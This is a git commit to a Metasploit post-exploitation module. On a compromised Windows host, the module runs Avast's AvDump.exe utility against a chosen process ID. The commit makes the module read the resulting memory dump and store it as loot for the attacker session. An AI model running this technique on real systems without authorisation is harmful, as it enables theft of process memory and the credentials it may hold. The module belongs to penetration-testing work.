ff220946e3c93f9d53fd9101094549b08f47f031
Jared Stroud <1250113+jaredestroud@users.noreply.github.com>
2020-10-21 23:36:51 -0400

    Updating loot placeholder to take memdump

--- modules/post/windows/gather/avast_memory_dump.rb
+++ modules/post/windows/gather/avast_memory_dump.rb
@@ -17,13 +17,13 @@ class MetasploitModule < Msf::Post
     ))
 
     register_options ( [
-        OptString.new('PID', [true, 'specify pid to dump']),
+        OptString.new('PID', [true, 'specify pid to dump' ]),
         OptString.new('DUMP_PATH', [true, 'specify location to write dump file to', "C:\\Users\\Public\\tmp.dmp"])
     ])
   end
 
   def check_for_dump
-    if file_exist?("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe") 
+    if file_exist?("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe")
         print_status("AvDump.exe exists!")
         return true
     else
@@ -37,7 +37,8 @@ class MetasploitModule < Msf::Post
     if check_for_dump
         print_status("executing Avast mem dump utility against #{datastore['PID']} to #{datastore['DUMP_PATH']}")
         result = cmd_exec("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe --pid #{datastore['PID']} --exception_ptr 0 --thread_id 0 --dump_file #{datastore['DUMP_PATH']} --min_interval 0")
-        store_loot("host.avast.memdump", "binary/db", session, "avast_memdump")
+        mem_file = read_file("#{datastore['DUMP_PATH']}")
+        store_loot("host.avast.memdump", "binary/db", session, mem_file)
         print_status(result)
     end
   end
